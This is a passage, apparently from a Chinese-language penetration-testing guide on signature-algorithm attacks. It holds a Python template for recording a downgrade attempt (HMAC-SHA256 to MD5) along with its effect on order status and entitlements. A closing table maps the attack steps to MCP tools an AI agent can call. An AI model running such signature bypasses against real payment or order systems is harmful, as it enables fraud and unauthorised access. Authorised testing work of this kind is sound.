5. **verification**: 说明为什么篡改后签名仍能通过
6. **flag**: 自动从响应提取

```python
# evidence_template.py — 算法攻击证据模板
ALGORITHM_EVIDENCE_TEMPLATE = {
    "vulnerability_class": "signature_algorithm_attack",
    "subtype": "downgrade | none | confusion | encoding | length",
    "baseline": {
        "url": "",
        "method": "POST",
        "algorithm": "HMAC-SHA256",
        "signature": "abc...",
        "status": 200,
    },
    "attack": {
        "modified_fields": {"sign_type": "MD5"},
        "signature": "def...",
        "explanation": "",
    },
    "result": {
        "status": 200,
        "body_preview": "",
        "order_status": "",
        "entitlement_change": "",
    },
    "verification": {
        "why_it_works": "",
        "server_accepts_algorithm": "",
        "signature_length_check": "",
    },
}
```
## MCP 工具映射

AI Agent 可调用以下 MCP 工具自动完成或加速上述攻击步骤：

| 攻击步骤 | MCP 工具 | 说明 |
|---------|---------|------|
| 签名算法探测 | `http_probe` | HTTP GET 探测签名算法信息 |
| 知识检索 | `kb_router` | 按签名算法攻击信号搜索知识库 |
